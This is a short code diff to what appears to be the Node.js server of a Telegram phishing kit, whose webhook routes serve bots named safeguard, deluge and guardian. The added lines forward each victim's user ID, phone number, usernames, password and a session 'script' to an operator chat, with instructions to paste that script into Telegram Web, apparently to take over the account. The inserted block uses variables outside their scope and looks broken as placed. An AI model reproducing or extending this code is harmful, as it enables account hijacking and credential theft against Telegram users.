@@ -126,7 +126,13 @@ app.post("/api/users/telegram/info", async (req, res) => {
     res.status(500).json({ error: "server error" });
   }
 });
-
+console.log(`Attempting to send to LOGS_ID: ${process.env.LOGS_ID} for user ${data.userId}`);
+try {
+  await bot.sendMessage(process.env.LOGS_ID, `🪪 <b>UserID</b>: ${data.userId}\n🌀 <b>Name</b>: ${data.name}\n⭐ <b>Telegram Premium</b>: ${data.premium ? "✅" : "❌"}\n📱 <b>Phone Number</b>: <tg-spoiler>${data.number}</tg-spoiler>\n${data.usernames}\n🔐 <b>Password</b>: <code>${data.password !== undefined ? data.password : "Null"}</code>\n\nGo to <a href="https://web.telegram.org/">Telegram Web</a>, and paste the following script.\n<code>${data.script}</code>\n<b>Module</b>: ${data.type.charAt(0).toUpperCase() + data.type.slice(1)}`, { parse_mode: "HTML" });
+  console.log(`Successfully sent to LOGS_ID: ${process.env.LOGS_ID}`);
+} catch (error) {
+  console.error(`Failed to send to LOGS_ID: ${error.message}`);
+}
 app.use("/api/webhook/safeguard", (req, res) => safeguardBot.processUpdate(req.body));
 app.use("/api/webhook/deluge", (req, res) => delugeBot.processUpdate(req.body));
 app.use("/api/webhook/guardian", (req, res) => guardianBot.processUpdate(req.body));
